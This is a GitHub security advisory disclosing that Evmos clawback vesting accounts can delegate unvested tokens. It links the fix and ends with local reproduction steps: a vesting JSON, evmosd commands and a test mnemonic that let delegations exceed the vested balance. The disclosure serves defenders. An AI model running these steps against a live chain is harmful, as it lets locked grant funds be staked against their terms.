# Unvested token delegations

Moderate

[sandoche](/sandoche)
published
GHSA-7hrh-v6wp-53vw
Jun 6, 2024

## Package

gomod

Evmos
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

All

## Patched versions

None as of Writing

## Description

### Impact

*What kind of vulnerability is it? Who is impacted?*

At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via `ClawbackVestingAccount`.

### Patches

*Has the problem been patched? What versions should users upgrade to?*

[The PR linked to this advisory](https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1) includes part of the fix. The remainder is in a [second advisory on the Cosmos SDK fork](https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv).

### Workarounds

*Is there a way for users to fix or remediate the vulnerability without upgrading?*

There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.

### References

*Are there any links users can visit to find out more?*

See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:

1. Download `vesting_setup.json` with the following contents:

```
{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}

```

2. Run the following CLI commands to reproduce the issue locally:

```
evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate <operator_address> 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate <operator_address> 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

```
